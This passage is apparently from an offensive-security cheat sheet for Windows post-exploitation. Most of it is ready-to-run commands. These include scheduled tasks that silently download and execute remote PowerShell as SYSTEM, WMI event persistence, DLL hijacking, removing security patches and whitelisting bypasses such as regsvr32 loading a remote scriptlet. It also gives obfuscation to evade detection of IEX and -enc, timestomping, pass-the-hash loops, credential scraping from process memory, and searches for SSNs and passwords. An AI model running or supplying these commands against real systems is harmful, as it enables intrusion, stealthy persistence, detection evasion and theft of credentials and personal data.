    schtasks /create /tn OfficeUpdaterA /tr &quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://&lt;ip address&gt;/&lt;uri&gt;&#39;&#39;&#39;))&#39;&quot; /sc onlogon /ru System

    #(X64) - On System Start
    schtasks /create /tn OfficeUpdaterB /tr &quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://&lt;ip address&gt;/&lt;uri&gt;&#39;&#39;&#39;))&#39;&quot; /sc onstart /ru System

    #(X64) - On User Idle (30mins)
    schtasks /create /tn OfficeUpdaterC /tr &quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http://192.168.95.195:8080/kBBldxiub6&#39;&#39;&#39;))&#39;&quot; /sc onidle /i 30
</code></pre></div>
<h5 id="additional-notes">Additional Notes<a class="headerlink" href="#additional-notes" title="Permanent link">&para;</a></h5>
<p>Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash () AND quotation marks ("):</p>
<p>Delete scheduled task without prompting</p>
<div class="highlight"><pre><span></span><code>    schtasks /delete /f /TN taskname
</code></pre></div>
<p>Detailed scheduled tasks listing</p>
<div class="highlight"><pre><span></span><code>    schtasks /query /V /FO list
</code></pre></div>
<p>View scheduled tasks log (for troubleshooting)</p>
<div class="highlight"><pre><span></span><code>    notepad c:\windows\schedlgu.txt (Windows XP)

    notepad c:\windows\tasks\schedlgu.txt (Vista+)
</code></pre></div>
<h4 id="windows-service">Windows Service<a class="headerlink" href="#windows-service" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>    sc query
    sc create &lt;\\Target(optional)&gt; &lt;servicename&gt; binPath= &lt;service binary path&gt; type= share start= auto DisplayName= &lt;display name&gt;
    sc delete &lt;servicename&gt;
</code></pre></div>
<h4 id="dll-hijacking">DLL-Hijacking<a class="headerlink" href="#dll-hijacking" title="Permanent link">&para;</a></h4>
<p>Order of DLL Loading</p>
<div class="highlight"><pre><span></span><code>1. The directory from which the application is loaded
2. The current directory
3. The system directory, usually C:\\Windows\\System32\\ (The GetSystemDirectory function is called to obtain this directory.)
4. The 16-bit system directory - There is no dedicated function to retrieve the path of this directory, but it is searched as well.
5. The Windows directory. The GetWindowsDirector function is called to obtain this directory.
6. The directories that are listed in the PATH environment variable.
</code></pre></div>
<p>Many systems use bginfo (seen it a lot in operational sys). Drop Riched32.dll in the dir with bginfo.exe. Codex.</p>
<p>Older list of dlls as well (2010). <a href="https://www.exploit-db.com/dll-hijacking-vulnerable-applications/">https://www.exploit-db.com/dll-hijacking-vulnerable-applications/</a></p>
<p>On Windows 7 there are three executables that could be exploited and associated DLLs listed below</p>
<div class="highlight"><pre><span></span><code>    C:\windows\ehome\Mcx2Prov.exe
    C:\Windows\ehome\CRYPTBASE.dll

    C:\windows\System32\sysprep\sysprep.exe
    C:\Windows\System32\sysprep\CRYPTSP.dll
    C:\windows\System32\sysprep\CRYPTBASE.dll
    C:\Windows\System32\sysprep\RpcRtRemote.dll
    C:\Windows\System32\sysprep\UxTheme.dll

    C:\windows\System32\cliconfg.exe
    C:\Windows\System32\NTWDBLIB.DLL
</code></pre></div>
<p>On Windows 8 there are also three executables that could be exploited and associated DLLs listed below</p>
<div class="highlight"><pre><span></span><code>    C:\windows\System32\sysprep\sysprep.exe
    C:\windows\System32\sysprep\CRYPTBASE.dll
    C:\Windows\System32\Sysprep\dwmapi.dll
    C:\Windows\System32\Sysprep\SHCORE.dll

    C:\windows\System32\cliconfg.exe
    C:\Windows\System32\NTWDBLIB.DLL

    C:\windows\System32\pwcreator.exe
    C:\Windows\System32\vds.exe
    C:\Windows\System32\UReFS.DLL
</code></pre></div>
<p>Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below</p>
<div class="highlight"><pre><span></span><code>    C:\windows\System32\sysprep\sysprep.exe
    C:\Windows\System32\Sysprep\SHCORE.dll
    C:\Windows\System32\Sysprep\OLEACC.DLL

    C:\windows\System32\cliconfg.exe
    C:\Windows\System32\NTWDBLIB.DLL

    C:\windows\System32\pwcreator.exe
    C:\Windows\System32\vds.exe
    C:\Program Files\Common Files\microsoft shared\ink\CRYPTBASE.dll
    C:\Program Files\Common Files\microsoft shared\ink\CRYPTSP.dll
    C:\Program Files\Common Files\microsoft shared\ink\dwmapi.dll
    C:\Program Files\Common Files\microsoft shared\ink\USERENV.dll
    C:\Program Files\Common Files\microsoft shared\ink\OLEACC.dll
</code></pre></div>
<h5 id="linkinfodll-replacement">linkinfo.dll Replacement<a class="headerlink" href="#linkinfodll-replacement" title="Permanent link">&para;</a></h5>
<p>Windows explorer in older systems loads linkinfo.dll from c:\windows over c:\windows\system32 if it exists</p>
<div class="highlight"><pre><span></span><code>    copy evil.dll c:\windows\linkinfo.dll
</code></pre></div>
<h4 id="wmi-event-persistence-via-powershell">WMI Event Persistence via Powershell<a class="headerlink" href="#wmi-event-persistence-via-powershell" title="Permanent link">&para;</a></h4>
<p>WMI Event persistence explained, you can find a bloated version in powersploit.
Three parts to this:</p>
<ul>
<li>WMI Event Filter</li>
<li>Event Consumer</li>
<li>Filter/Consumer Binding
  This technique gets you <em>SYSTEM</em> level persistence, requires admin rights to execute.
  Autoruns doesn't even check for this yet. (doubt any AVs are either)
  Difficult to detect, Difficult to remove if you dont know what youre doing.</li>
</ul>
<h5 id="wmi-event-filter">WMI Event Filter<a class="headerlink" href="#wmi-event-filter" title="Permanent link">&para;</a></h5>
<p>Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing)</p>
<div class="highlight"><pre><span></span><code>    $EventFilter = ([WMICLASS]&quot;\\.\root\subscription:__EventFilter&quot;).CreateInstance()
    $EventFilter.QueryLanguage  = &quot;WQL&quot;
    $EventFilter.Query          = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325&quot;
    $EVentFilter.EventNamespace = &quot;root\cimv2&quot;
    $EventFilter.Name           = &quot;OBVIOUSHACKER&quot;
    $Result = $EventFilter.Put()
    $Filter = $Result.Path
</code></pre></div>
<p><a href="http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx</a></p>
<h5 id="event-consumer">Event Consumer<a class="headerlink" href="#event-consumer" title="Permanent link">&para;</a></h5>
<p>Configure what to execute once the event occurs.
Current example is just a ping.</p>
<div class="highlight"><pre><span></span><code>    $InstanceConsumer = ([wmiclass]&quot;\\.\root\subscription:CommandLineEventConsumer&quot;).CreateInstance()
    $InstanceConsumer.Name = &quot;OBVIOUSHACKER&quot;
    $InstanceConsumer.CommandLineTemplate = &quot;ping 127.0.0.1 -n 100&quot;          #CMD TO EXECUTE HERE
    $InstanceConsumer.WorkingDirectory = &quot;C:\\windows\\system32&quot;
    $Result = $InstanceConsumer.Put()
    $Consumer = $Result.Path
</code></pre></div>
<p><a href="http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx</a>
<a href="http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx</a></p>
<h5 id="filterconsumer-binding">Filter/Consumer Binding<a class="headerlink" href="#filterconsumer-binding" title="Permanent link">&para;</a></h5>
<p>This is the object that correlates the Filter with the Consumer.
Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service.</p>
<div class="highlight"><pre><span></span><code>    $InstanceBinding = ([wmiclass]&quot;\\.\root\subscription:__FilterToConsumerBinding&quot;).CreateInstance()
    $InstanceBinding.Filter   = $Filter
    $InstanceBinding.Consumer = $Consumer
    $Result = $InstanceBinding.Put()
</code></pre></div>
<p><a href="http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx</a></p>
<h5 id="removal">REMOVAL<a class="headerlink" href="#removal" title="Permanent link">&para;</a></h5>
<p>The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example)</p>
<div class="highlight"><pre><span></span><code>    Get-WmiObject __eventFilter -namespace root\subscription -filter &quot;name=&#39;OBVIOUSHACKER&#39;&quot;| Remove-WmiObject
    Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter &quot;name=&#39;OBVIOUSHACKER&#39;&quot; | Remove-WmiObject
    Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match &#39;OBVIOUSHACKER&#39;} | Remove-WmiObject
</code></pre></div>
<p><a href="http://www.exploit-monday.com/2013/04/PersistenceWithPowerShell.html">Some more detailed information on the subject</a></p>
<p><a href="http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/">http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/</a></p>
<h4 id="malicious-outlook-rules">Malicious Outlook Rules<a class="headerlink" href="#malicious-outlook-rules" title="Permanent link">&para;</a></h4>
<ul>
<li><a href="https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/">https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/</a></li>
<li>
<p>Ruler</p>
</li>
<li>
<p><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></p>
</li>
</ul>
<h4 id="windows-remote-management-winrm-psremoting">Windows Remote Management (WinRM) / PSRemoting<a class="headerlink" href="#windows-remote-management-winrm-psremoting" title="Permanent link">&para;</a></h4>
<ul>
<li>Listens on 5985/5986 by default and allows interactive shell access over HTTP/S</li>
<li>Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module)</li>
<li>Metasploit has multiple modules for locating the service and gaining shells over WinRM</li>
</ul>
<p><em>Connect to a remote host with WinRM from local Windows host</em></p>
<div class="highlight"><pre><span></span><code>    Enable-PSRemoting
    Set-Item -Path WSMan:\localhost\Client\TrustedHosts * -force
    or
    Set-Item -Path WSMan:\localhost\Client\TrustedHosts -value &quot;&lt;host&gt;&quot; -Force
    $cred = Get-Credential
    Invoke-Command -ComputerName &lt;host&gt; -ScriptBlock { gci c:\ } -credential $cred
</code></pre></div>
<h4 id="uninstall-a-patch-to-leave-the-system-vulnerable">Uninstall a patch to leave the system vulnerable<a class="headerlink" href="#uninstall-a-patch-to-leave-the-system-vulnerable" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>    wusa.exe /uninstall /kb:976932
</code></pre></div>
<h4 id="create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords">Create custom DLL for password filters and install on DC to capture changed passwords<a class="headerlink" href="#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords" title="Permanent link">&para;</a></h4>
<ul>
<li><a href="http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html">http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html</a></li>
</ul>
<h3 id="application-whitelisting-bypass-techniques">Application Whitelisting Bypass Techniques<a class="headerlink" href="#application-whitelisting-bypass-techniques" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt">SubTee Collection of Whitelist Bypass Techniques </a>
<a href="https://bitbucket.org/jsthyer/wevade.git">https://bitbucket.org/jsthyer/wevade.git</a></p>
<p>Version .0.0.3</p>
<div class="highlight"><pre><span></span><code>1. IEExec -This technique may work in certain environments.  Its relies on the fact that many organizations trust executables signed
by Microsoft.  We can misuse this trust by launching a specially crafted .NET application.
Example Here: https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/

2.  Rundll32.exe

3.  ClickOnce Applications dfsvc.exe dfshim.dll

4.  XBAP - XML Browser Applications WPF PresentationHost.exe

5.  MD5 Hash Collision
http://www.mathstat.dal.ca/~selinger/md5collision/

6.  PowerShell - Specifically Reflective Execution
http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf

7. .HTA Application Invoke PowerShell Scripts
    Launched by mshta.exe, bypasses IE security settings as well.

8.  bat, vbs, ps1
    1. cmd.exe /k &lt; script.txt
    2. cscript.exe //E:vbscript script.txt
    3. Get-Content script.txt | iex

9. Malicious Troubleshooting packs - MSDT.exe
    Reference: http://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
    Thanks to @nberthaume, @Killswitch_GUI

10. InstallUtil.exe
    A signed MS binary that loads assemblies and executes - One of the best.
    Examples here: https://gist.github.com/subTee

11. Regsvcs/Regasm
    See: https://gist.github.com/subTee/fb09ef511e592e6f7993
    These 2 are Excellent.

12. regsvr32.exe
    https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
    This one is just simply amazing...
    regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

13. Msbuild.exe
    http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html
</code></pre></div>
<h3 id="certutil">Certutil<a class="headerlink" href="#certutil" title="Permanent link">&para;</a></h3>
<p><a href="https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46">https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46</a></p>
<p>File download</p>
<div class="highlight"><pre><span></span><code>    certutil -urlcache -split -f http://example.com/file
</code></pre></div>
<h3 id="active-directory-enumeration">Active Directory Enumeration<a class="headerlink" href="#active-directory-enumeration" title="Permanent link">&para;</a></h3>
<h4 id="adfind">Adfind<a class="headerlink" href="#adfind" title="Permanent link">&para;</a></h4>
<p><a href="http://www.joeware.net/freetools/tools/adfind/">www.joeware.net/freetools/tools/adfind/</a></p>
<div class="highlight"><pre><span></span><code>    AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f &quot;objectcategory=computer&quot; &gt; domain_computers.txt

    AdFind.exe -u account@domain.com -up password -h 10.4.128.40:389 -b dc=domain,dc=com -f &quot;objectcategory=computer&quot; distinguishedName dNSHostName description whenchanged operatingSystem operatingSystemVersion &gt; domain_computers_light.txt

    AdFind.exe -u account@domain.com -up pass -h 10.4.128.40:389 -b dc=domain,dc=com -f &quot;objectcategory=user&quot; samaccountname description pwdlastset orclcommonattribute &gt; domain_users_light.txt
</code></pre></div>
<h3 id="powershell">Powershell<a class="headerlink" href="#powershell" title="Permanent link">&para;</a></h3>
<p>List help for cmdlet: <code>Get-Help [cmdlet] -full</code></p>
<p>List available properties and methods: <code>Get-Member</code></p>
<p>For-each loop: <code>ForEach-Object { $_ }</code></p>
<p>Search for string (like grep): <code>Select-String -path [file] -pattern [string]</code></p>
<p>Timestomp</p>
<div class="highlight"><pre><span></span><code>    $file=(gi c:\file.exe);
    $date=&#39;01/03/2009 12:12 pm&#39;;
    $file.LastWriteTime=$date;
    $file.LastAccessTime=$date;
    $file.CreationTime=$date
</code></pre></div>
<p>Show last system boot time</p>
<div class="highlight"><pre><span></span><code>    Get-WmiObject win32_operatingsystem | select csname, @{LABEL=&#39;LastBootUpTime&#39;; EXPRESSION={$_.ConverttoDateTime($_.lastbootuptime)}}
</code></pre></div>
<p>Wrap binary execution in a powershell loop</p>
<div class="highlight"><pre><span></span><code>    powershell foreach ($target in (get-content c:\users\username\appdata\local\temp\hosts_da_loggedin_unique.txt)) { &quot;[*] $Target:&quot;; (c:\programdata\sd.exe ./administrator@$target -hashes aad3b435b51404eeaad3b435b51404ee:a4bab1c7d4bef62d4c22043ddbf1312c) }`
</code></pre></div>
<p>Download a file</p>
<div class="highlight"><pre><span></span><code>    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(new-object system.net.webclient).downloadfile(&quot;https://www.mydomain.com/file&quot;,&quot;C:\Users\username\AppData\Local\Temp\file.txt&quot;)
</code></pre></div>
<p>Encode string</p>
<div class="highlight"><pre><span></span><code>    echo &quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.1:80/file&#39;)&quot; | iconv --to-code UTF-16LE | base64 -w 0
</code></pre></div>
<p>List recently modified files in path (U:)</p>
<div class="highlight"><pre><span></span><code>    Get-Childitem u:\ -Recurse | where-object {!($_.psiscontainer)} | where { $_.LastWriteTime -gt $(Get-Date).AddDays(-1)  } | foreach {&quot;$($_.LastWriteTime) :: $($_.Fullname) &quot;  }
</code></pre></div>
<p>List Files</p>
<div class="highlight"><pre><span></span><code>    Select-String -Path c:\fso\*.txt, c:\fso\*.log -pattern ed
</code></pre></div>
<p>List First 100 Files</p>
<div class="highlight"><pre><span></span><code>    Get-ChildItem -Path XXX |Select -First 100 Fullname
</code></pre></div>
<p>List a Process's Loaded Modules (DLL)</p>
<div class="highlight"><pre><span></span><code>    get-process -id 1234|select -expand modules
</code></pre></div>
<p>Remote Command Execution using MMC</p>
<div class="highlight"><pre><span></span><code>    https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
</code></pre></div>
<p>Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C<span class="arithmatex"><span class="MathJax_Preview">,ADMIN</span><script type="math/tex">,ADMIN</script></span>)</p>
<div class="highlight"><pre><span></span><code>    Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ |Select LocalAccountTokenFilterPolicy |fl
</code></pre></div>
<p>Test User Credentials</p>
<div class="highlight"><pre><span></span><code>    powerpick $password = ConvertTo-SecureString &quot;PlainTextPassword&quot; -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential (&quot;domain\name&quot;, $password);
</code></pre></div>
<p>Search for SSN</p>
<p><a href="https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx">https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx</a></p>
<div class="highlight"><pre><span></span><code>    $SSN_Regex = &quot; [0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}&quot; ; Get-ChildItem . -Recurse -exclude *.exe,*.dll| Select-String -Pattern $SSN_Regex | Select-String -Pattern $SSN_Regex| Select-Object Path,Filename,Matches |ft -auto|out-string -width 200; &quot;[*] SSN Search Complete!&quot;
</code></pre></div>
<p>Enumerate the use of the Windows Server Update Services (WSUS)</p>
<div class="highlight"><pre><span></span><code>    Get-ItemProperty -Path Registry::&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate&quot; |Select-Object -ExpandProperty WUServer

    Get-ItemProperty -Path Registry::&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate&quot; |Select-Object -ExpandProperty WUStatusServer

    Get-ItemProperty -Path Registry::&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU&quot; |Select-Object -ExpandProperty UseWUServer

    reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
</code></pre></div>
<p>Get unquoted service paths</p>
<div class="highlight"><pre><span></span><code>    gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith(&quot;`&quot;&quot;)} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(&quot;.&quot;) +4)) -match &quot;.* .*&quot;}
</code></pre></div>
<h4 id="find-files-custom">Find-Files (custom)<a class="headerlink" href="#find-files-custom" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>    Find-Files -searchBase &quot;i:\&quot; -searchTerms &quot;*web.xml*,*web.config*,*password*,*tomcat-users.xml*&quot; -LogPath &quot;C:\Users\username\AppData\Local\Temp&quot;
</code></pre></div>
<h4 id="get-enumeration-custom">Get-Enumeration (custom)<a class="headerlink" href="#get-enumeration-custom" title="Permanent link">&para;</a></h4>
<p>Run Local and Domain enumeration functions on the local host.</p>
<div class="highlight"><pre><span></span><code>    Get-Enumeration -Path . -Local -Domain
</code></pre></div>
<h4 id="download-and-execute-iex">Download and execute IEX<a class="headerlink" href="#download-and-execute-iex" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>    powershell -nop -w hidden -c &quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.1:80/file&#39;)&quot;
</code></pre></div>
<h4 id="encodedcommand-and-iex-detection-bypass">EncodedCommand and IEX detection bypass<a class="headerlink" href="#encodedcommand-and-iex-detection-bypass" title="Permanent link">&para;</a></h4>
<p>Author: Dave Kennedy
Source: <a href="https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/">https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/</a></p>
<p>Avoid detection of -enc</p>
<div class="highlight"><pre><span></span><code>    powershell -window hidden -C &quot;set-variable -name &quot;C&quot; -value &quot;-&quot;; set-variable -name &quot;s&quot; -value &quot;e&quot;; set-variable -name &quot;q&quot; -value &quot;c&quot;; set-variable -name &quot;P&quot; -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() &lt;b64encodedcommandhere&gt;&quot;
</code></pre></div>
<p>Avoid detection of IEX</p>
<div class="highlight"><pre><span></span><code>    powershell -window hidden -C &quot;set-variable -name &quot;LB&quot; -value &quot;I&quot;; set-variable -name &quot;I&quot; -value &quot;E&quot;; set-variable -name &quot;V&quot; -value &quot;X&quot;; set-variable -name &quot;wP&quot; -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() (&#39;&lt;YOURINVOKEEXPRESSIONSTUFFHERE&gt;&#39;)&quot;
</code></pre></div>
<h4 id="bloodhound">Bloodhound<a class="headerlink" href="#bloodhound" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>    iex((new-object system.net.webclient).downloadstring(&#39;https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1&#39;));Invoke-Bloodhound -CSVFolder c:\temp -CSVPrefix &lt;prefix&gt;

    Invoke-BloodHound -DomainController &lt;domain IP&gt; -Domain &lt;FQDN&gt; -CSVFolder C:\users\public\libraries -CSVPrefix &lt;prefix&gt; -CollectionMethod Stealth
</code></pre></div>
<h4 id="mimikittenz">Mimikittenz<a class="headerlink" href="#mimikittenz" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/putterpanda/mimikittenz">https://github.com/putterpanda/mimikittenz</a></p>
<p>mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.</p>
<p>mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to:</p>
<ul>
<li>TRACK2 (CreditCard) data from merchant/POS processes</li>
<li>PII data</li>
<li>Encryption Keys &amp; All the other goodstuff</li>
</ul>
<p>Execution</p>
<div class="highlight"><pre><span></span><code>    Invoke-Mimikittenz
</code></pre></div>
<p>Customizations</p>
<div class="highlight"><pre><span></span><code>    Custom regex - The syntax for adding custom regex is as follows:
    [mimikittenz.MemProcInspector]::AddRegex(&quot;&lt;NameOfTarget&gt;&quot;,&quot;&lt;regex_here&gt;&quot;)

    Custom target process - Just append your target proccess name into the array:
    [mimikittenz.MemProcInspector]::InspectManyProcs(&quot;iexplore&quot;,&quot;chrome&quot;,&quot;firefox&quot;)
</code></pre></div>
<h4 id="powerup">PowerUp<a class="headerlink" href="#powerup" title="Permanent link">&para;</a></h4>
<p>Performs multiple local host privilege escalation checks for common Windows misconfigurations.</p>
<div class="highlight"><pre><span></span><code>    Invoke-AllChecks
</code></pre></div>
<p><a href="https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf">See cheat sheet for more commands</a></p>
<h4 id="powerview">PowerView<a class="headerlink" href="#powerview" title="Permanent link">&para;</a></h4>
<ul>
<li>Requires domain user privileges</li>
</ul>
<p>Find Administrative users logged in across the domain - default group = Domain Admins)</p>
<div class="highlight"><pre><span></span><code>    Invoke-UserHunter -Threads 15 -NoPing [-GroupName “Enterprise Admins”]
    Invoke-UserHunter -Threads 20 -GroupName &quot;Domain Admins&quot; -SearchForest -CheckAccess
</code></pre></div>
<p>Find User (Stealthy via Fileshares)</p>
<div class="highlight"><pre><span></span><code>    Invoke-UserHunter -Stealth -Threads 5 -NoPing [-GroupName “Enterprise Admins”] [-UserName &quot;svcAccount&quot;]
</code></pre></div>
<p>Get domain user info</p>
<div class="highlight"><pre><span></span><code>    Get-NetUser [-UserName john]

    Get-NetUser -Domain &lt;domain&gt; | Select-Object objectsid,lockouttime,samaccounttype,accountexpires,objectclass,useraccountcontrol,@{Name=&#39;memberof&#39;;Expression={[string]::join(&quot;;&quot;,($_.memberof))}},info,distinguishedname,adspath,cn,pwdlastset,objectguid,whencreated,description,samaccountname,usnchanged,name|  export-csv userprops_members.csv
</code></pre></div>
<p>Find group names</p>
<div class="highlight"><pre><span></span><code>    Get-NetGroup [-GroupName *admin*]
</code></pre></div>
<p>Get group members</p>
<div class="highlight"><pre><span></span><code>    Get-NetGroupMember [-GroupName “Domain Admins”]
</code></pre></div>
<p>Find open shares - Noisy</p>
<div class="highlight"><pre><span></span><code>    Invoke-ShareFinder -CheckShareAccess
</code></pre></div>
<p>Find open (non-default i.e. C$) shares by LDAP source</p>
<div class="highlight"><pre><span></span><code>    Invoke-ShareFinder -ComputerADSPath &quot;LDAP://OU=Servers,OU=IT,DC=domain,DC=com&quot; -CheckShareAccess -ExcludeStandard | Out-File -Encoding ascii c:\windows\temp\server_shares.txt

    Invoke-ShareFinder -ExcludePrint -ExcludeIPC -CheckShareAccess
</code></pre></div>
<p>Find interesting files</p>
<div class="highlight"><pre><span></span><code>    powershell Invoke-FileFinder -ComputerName &lt;hostname&gt; -share share_list.txt -terms ssn,pass,sensitive,secret,admin,login,unattend*.xml,web.config,account -Threads 20 | export-csv filefinder_shares.csv
</code></pre></div>
<p>Find hosts where the current user is local admin - Noisy</p>
<div class="highlight"><pre><span></span><code>    Find-LocalAdminAccess
</code></pre></div>
<p>Get details of all domain computers and export to a CSV file for easy viewing</p>
<div class="highlight"><pre><span></span><code>    Get-computerproperty -Domain &lt;domain.com&gt; -properties displayname,adspath,lastlogontimestamp,operatingsystem,operatingsystemversion,@{Name=&#39;memberof&#39;;Expression={[string]::join(&quot;;&quot;,($_.memberof))}}|export-csv computerprops.csv
</code></pre></div>
<p>Get Computers with Unconstrained Delegation</p>
<div class="highlight"><pre><span></span><code>    Get-NetComputer -Unconstrained |ft -a
</code></pre></div>
<p>Get Users &amp; Computers Trusted for Delegation</p>
<div class="highlight"><pre><span></span><code>    Get-DomainUser -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl

    Get-DomainComputer -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl
</code></pre></div>
<h5 id="net-functions">net * Functions:<a class="headerlink" href="#net-functions" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    Get-NetDomain                   -   gets the name of the current user&#39;s domain
    Get-NetForest                   -   gets the forest associated with the current user&#39;s domain
    Get-NetForestDomain             -   gets all domains for the current forest
    Get-NetDomainController         -   gets the domain controllers for the current computer&#39;s domain
    Get-NetUser                     -   returns all user objects, or the user specified (wildcard specifiable)
    Add-NetUser                     -   adds a local or domain user
    Get-NetComputer                 -   gets a list of all current servers in the domain
    Get-NetPrinter                  -   gets an array of all current computers objects in a domain
    Get-NetOU                       -   gets data for domain organization units
    Get-NetSite                     -   gets current sites in a domain
    Get-NetSubnet                   -   gets registered subnets for a domain
    Get-NetGroup                    -   gets a list of all current groups in a domain
    Get-NetGroupMember              -   gets a list of all current users in a specified domain group
    Get-NetLocalGroup               -   gets the members of a localgroup on a remote host or hosts
    Add-NetGroupUser                -   adds a local or domain user to a local or domain group
    Get-NetFileServer               -   get a list of file servers used by current domain users
    Get-DFSshare                    -   gets a list of all distribute file system shares on a domain
    Get-NetShare                    -   gets share information for a specified server
    Get-NetLoggedon                 -   gets users actively logged onto a specified server
    Get-NetSession                  -   gets active sessions on a specified server
    Get-NetRDPSession               -   gets active RDP sessions for a specified server (like qwinsta)
    Get-NetProcess                  -   gets the remote processes and owners on a remote server
    Get-UserEvent                   -   returns logon or TGT events from the event log for a specified host
    Get-ADObject                    -   takes a domain SID and returns the user, group, or computer
                                        object associated with it
    Set-ADObject                    -   takes a SID, name, or SamAccountName to query for a specified
                                        domain object, and then sets a specified &#39;PropertyName&#39; to a
                                        specified &#39;PropertyValue&#39;
</code></pre></div>
<h5 id="gpo-functions">GPO functions<a class="headerlink" href="#gpo-functions" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    Get-GptTmpl                     -   parses a GptTmpl.inf to a custom object
    Get-NetGPO                      -   gets all current GPOs for a given domain
    Get-NetGPOGroup                 -   gets all GPOs in a domain that set &quot;Restricted Groups&quot;
                                        on on target machines
    Find-GPOLocation                -   takes a user/group and makes machines they have effective
                                        rights over through GPO enumeration and correlation
    Find-GPOComputerAdmin           -   takes a computer and determines who has admin rights over it
                                        through GPO enumeration
    Get-DomainPolicy                -   returns the default domain or DC policy
</code></pre></div>
